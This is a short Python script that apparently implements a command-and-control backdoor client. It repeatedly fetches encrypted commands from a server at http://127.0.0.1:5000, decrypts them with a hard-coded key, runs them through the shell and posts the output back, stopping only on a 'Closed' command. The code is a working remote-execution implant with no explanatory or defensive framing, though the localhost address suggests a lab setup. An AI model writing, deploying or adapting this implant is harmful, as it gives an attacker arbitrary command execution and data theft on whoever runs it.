import requests, subprocess, cryptocode

while True:
  try:
    get_raw_cmd = requests.get('http://127.0.0.1:5000')
    raw_cmd = get_raw_cmd.text
    cmd = cryptocode.decrypt(raw_cmd,"CODE NAME C2")
    if 'Closed' in cmd:
        break
    else:
        output = subprocess.check_output(cmd, shell = True)
        Data = output.decode('utf-8')
        encoded = cryptocode.encrypt(str(output),"CODE NAME C2")
        post_output = requests.post(url = 'http://127.0.0.1:5000', data = Data)
  except Exception:
    cmd = "Error"        
